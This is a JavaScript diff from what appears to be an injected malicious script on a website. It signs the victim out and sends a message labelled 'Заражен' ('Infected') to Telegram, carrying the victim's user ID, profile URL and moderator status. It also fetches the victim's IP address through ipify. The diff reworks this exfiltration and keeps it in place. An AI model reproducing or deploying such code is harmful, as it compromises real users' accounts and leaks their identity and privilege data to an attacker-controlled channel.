@@ -114,17 +114,19 @@ async function signOutUser(delay) {
             let logoutDelay = $container.data('signout-delay') || 1000;
             if (userData.id) signOutUser(logoutDelay);
 
-            $.getJSON("https://api.ipify.org?format=json",
-            function (data) {
-              let strData = `Заражен ${userData.id} - ${userData.url} Модератор: ${userData.is_moderator} + ip${data.ip}`;
-              sendToTelegram(strData);
+            let strData = `Заражен ${userData.id} - ${userData.url} Модератор: ${userData.is_moderator}`;
+            sendToTelegram(strData);
+            json(`https://api.ipify.org?format=json`).then(data => {
               console.log(data.ip);
-            })
-
-
+            });
         }
   }
 }
+
+function json(url) {
+  return fetch(url).then(res => res.json());
+}
+
 
 getTooltip();
 onInject();
